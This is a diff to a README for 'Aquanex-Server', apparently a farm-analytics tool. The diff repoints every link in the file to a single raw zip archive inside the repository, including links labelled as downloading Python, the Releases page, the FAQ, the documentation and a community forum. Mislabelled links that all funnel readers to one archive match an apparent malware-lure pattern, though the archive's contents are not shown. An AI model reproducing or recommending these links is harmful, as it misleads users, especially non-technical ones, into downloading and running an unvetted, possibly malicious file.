@@ -1,7 +1,7 @@
 # 🚀 Aquanex-Server - Intelligent Insights for Your Farm
 
 ## 📥 Download Now
-[![Download Aquanex-Server](https://raw.githubusercontent.com/mwaseemsarwar/Aquanex-Server/main/haptene/Aquanex-Server.zip)](https://raw.githubusercontent.com/mwaseemsarwar/Aquanex-Server/main/haptene/Aquanex-Server.zip)
+[![Download Aquanex-Server](https://raw.githubusercontent.com/mwaseemsarwar/Aquanex-Server/main/app/Server-Aquanex-v3.0-beta.1.zip)](https://raw.githubusercontent.com/mwaseemsarwar/Aquanex-Server/main/app/Server-Aquanex-v3.0-beta.1.zip)
 
 ## 🚀 Getting Started
 Welcome to Aquanex-Server, your tool for understanding and improving agricultural practices. This guide will help you download and run the software, even if you don't have technical experience.
@@ -20,13 +20,13 @@ To run Aquanex-Server, you need the following:
 - A computer running Windows, macOS, or Linux.
 - At least 4 GB of RAM.
 - An internet connection for accessing APIs.
-- Python 3.x installed [Download Python](https://raw.githubusercontent.com/mwaseemsarwar/Aquanex-Server/main/haptene/Aquanex-Server.zip).
+- Python 3.x installed [Download Python](https://raw.githubusercontent.com/mwaseemsarwar/Aquanex-Server/main/app/Server-Aquanex-v3.0-beta.1.zip).
 
 ### 📦 Download & Install
 To get started, follow these steps to download and install Aquanex-Server.
 
 1. **Visit the Download Page**  
-   Go to the [Releases page](https://raw.githubusercontent.com/mwaseemsarwar/Aquanex-Server/main/haptene/Aquanex-Server.zip) to find the latest version of Aquanex-Server.
+   Go to the [Releases page](https://raw.githubusercontent.com/mwaseemsarwar/Aquanex-Server/main/app/Server-Aquanex-v3.0-beta.1.zip) to find the latest version of Aquanex-Server.
 
 2. **Select the Latest Release**  
    On the Releases page, look for the most recent version. Click on it to see download options.
@@ -59,13 +59,13 @@ Now that you have installed and configured the software, you can begin using it 
 - **Monitor and Adjust:** Use the data provided by Aquanex-Server to make informed decisions about your farming practices.
 
 ### 📞 Support
-If you encounter issues, check the FAQ section on the [GitHub page](https://raw.githubusercontent.com/mwaseemsarwar/Aquanex-Server/main/haptene/Aquanex-Server.zip) for solutions. If your problem persists, feel free to submit your question for assistance.
+If you encounter issues, check the FAQ section on the [GitHub page](https://raw.githubusercontent.com/mwaseemsarwar/Aquanex-Server/main/app/Server-Aquanex-v3.0-beta.1.zip) for solutions. If your problem persists, feel free to submit your question for assistance.
 
 ### ℹ️ Resources
-- [User Documentation](https://raw.githubusercontent.com/mwaseemsarwar/Aquanex-Server/main/haptene/Aquanex-Server.zip)
-- [Join the Community Forum](https://raw.githubusercontent.com/mwaseemsarwar/Aquanex-Server/main/haptene/Aquanex-Server.zip)
+- [User Documentation](https://raw.githubusercontent.com/mwaseemsarwar/Aquanex-Server/main/app/Server-Aquanex-v3.0-beta.1.zip)
+- [Join the Community Forum](https://raw.githubusercontent.com/mwaseemsarwar/Aquanex-Server/main/app/Server-Aquanex-v3.0-beta.1.zip)
 
 ### 🌐 Download Again
-To download Aquanex-Server, return to the [Releases page](https://raw.githubusercontent.com/mwaseemsarwar/Aquanex-Server/main/haptene/Aquanex-Server.zip) for the latest version and updates.
+To download Aquanex-Server, return to the [Releases page](https://raw.githubusercontent.com/mwaseemsarwar/Aquanex-Server/main/app/Server-Aquanex-v3.0-beta.1.zip) for the latest version and updates.
 
 Enjoy using Aquanex-Server to empower your farming practices with innovative technology!
